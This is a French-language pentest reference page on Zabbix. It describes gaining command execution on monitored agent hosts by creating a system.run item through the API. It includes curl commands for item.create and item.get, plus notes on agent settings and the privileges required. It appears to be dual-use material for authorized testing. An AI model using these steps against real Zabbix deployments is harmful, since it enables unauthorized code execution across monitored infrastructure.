---
title: "Exécution de commandes par item : system.run et items de commande"
order: 1
description: "Les items Zabbix dotés de la clé system.run exécutent une commande shell sur l'agent Zabbix lorsque l'item est vérifié, et les items de type commande s'exécutent de façon similaire. Un attaquant disposant des droits de création ou de modification d'items sur un hôte ajoute un item system.run et déclenche son évaluation, exécutant des commandes sur l'hôte de l'agent, qui est un système supervisé à travers le parc."
keywords:
  - system.run
  - item key
  - zabbix agent
  - command item
  - rce
---

# Exécution de commandes par item

Un item Zabbix définit ce qui doit être collecté, et la clé d'item `system.run[command,mode]` exécute une commande shell arbitraire sur l'agent Zabbix de l'hôte cible lorsque l'item est évalué. Un attaquant disposant de la permission de créer ou de modifier des items sur un hôte (via l'interface ou via `item.create`/`item.update` de l'API) ajoute un item `system.run` pointant vers sa commande, puis force ou attend son évaluation, et la commande s'exécute sur l'hôte de cet agent. Comme l'agent s'exécute sur les systèmes supervisés dans tout l'environnement, c'est une voie vers l'exécution de code sur de nombreux hôtes, pas seulement le serveur Zabbix, limitée aux hôtes que le rôle de l'attaquant peut configurer et dont les agents autorisent `system.run`.

```bash
Z=https://<target>/zabbix/api_jsonrpc.php; H='Content-Type: application/json-rpc'
# create a system.run item on a host (hostid from host.get), then check it
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"item.create","params":{
  "name":"x","key_":"system.run[id]","hostid":"<HOSTID>","type":0,
  "value_type":4,"interfaceid":"<IFID>","delay":"10s"},"auth":"'"$TOK"'","id":1}'
# trigger immediate evaluation (task.create ExecuteNow) or wait for the delay, then read the value
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"item.get","params":{"search":{"key_":"system.run"},"output":["lastvalue"]},"auth":"'"$TOK"'","id":1}'
```

## Notes d'exploitation

- La commande s'exécute sur l'hôte de l'agent (pas sur le serveur), ce qui permet d'atteindre les systèmes supervisés à travers le parc ; choisissez un hôte dont vous pouvez configurer l'agent et qui autorise `system.run`.
- Les agents contrôlent `system.run` : les agents plus anciens requièrent `EnableRemoteCommands=1`, les agents plus récents requièrent un `AllowKey=system.run[*]` (refusé par défaut), de sorte que l'exécution dépend de la configuration de l'agent, voir [Commandes distantes d'agent](agent-remote-commands.md).
- La sortie de la commande est capturée comme valeur de l'item (`value_type` texte), de sorte que vous relisez les résultats via `item.get lastvalue` ; utilisez `task.create` (ExecuteNow) pour déclencher immédiatement plutôt que d'attendre le relevé.
- Cela nécessite des droits de configuration d'items sur l'hôte cible ; un Super admin les possède partout, tandis qu'un rôle restreint peut n'atteindre que certains hôtes.

## Références

- [Zabbix : system.run agent item](https://www.zabbix.com/documentation/current/en/manual/config/items/itemtypes/zabbix_agent)
- [HackTricks : Zabbix](https://book.hacktricks.xyz/network-services-pentesting/pentesting-zabbix)
